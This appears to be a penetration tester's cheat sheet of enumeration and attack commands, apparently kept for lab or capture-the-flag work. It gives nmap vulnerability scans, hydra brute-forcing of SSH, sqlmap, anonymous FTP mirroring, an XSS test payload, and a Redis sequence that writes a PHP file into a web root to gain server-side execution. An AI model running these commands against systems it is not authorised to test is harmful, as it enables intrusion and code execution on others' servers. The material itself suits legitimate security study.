## Initial Enumeration
### Nmap
```
nmap -sS -sC -oN initial_scan.txt {IP}  
nmap -sS -p- -oN all_ports.txt {IP}
```
### Gobuster 
```
gobuster dir -u http://url -w /location/wordlist/file.txt  
gobuster vhost -u http://url -w /location/wordlist/file.txt  

/usr/share/seclists/Discovery/Web-Content/common.txt  
/usr/share/seclists/Discovery/Web-Content/big.txt  
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
```


### Enum4Linux
```
enum4linux -e options http://[ip]
```

### HTTP Request Banner Grabbing
```
Using Netcat
nc <target ip> 80

This will connect to the webserver which will allow you to send a request command

Head / HTTP/1.0

Hit enter twice as all headers have two spaces between them and the request. This should then 
return the Header of the request

```
### SMB 
```
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.189.42 192.168.189.42  

showmount -e 10.10.10.10  

smbclient -L 10.10.10.10

```
### Redis

```
Redis - 6379
nmap --script redis-info -sV -p 6379 <IP>

To check if the db is able to apply Server side execution run the following, then try to run the file from the browser.
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK

>info 
>get config *

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
```

### SQL
```
sqlmap -u http://192.168.202.163/login/index.php?id=1 --batch 
--batch bypasses all options when running commands

```

## Enumerating Discovered Ports

### 22 - SSH 
```
nc -vn <IP> 22
  
msf> use scanner/ssh/ssh_enumusers

hydra -L user.txt -P password.txt {IP} 22
```
  
### 21 FTP 
```
Anonymous Login Enabled
ftp {IP}
anonymous - Username
anonymous - Password 
  ls -al 
  
nmap --script ftp-* -p 21 <ip>

Downloads all files in FTP 
wget -m ftp://anonymous:anonymous@10.10.10.10

Connecting in a browser 
ftp://anonymous:anonymous@10.10.10.10
```

### 80/443 HTTP/HTTPS
#### Nikto 
```
nikto -h {URL}
nikto -h {URL} | tee nikto
```

## Subdomains 
### Sublister
```
sublist3r -d url.com
```

## XSS
### Testing if there is a xss vulnerability 
```
<script>alert("testing")</script>

```



## Active Directory
### Enumeration
### Exploits
### Post Exploitation






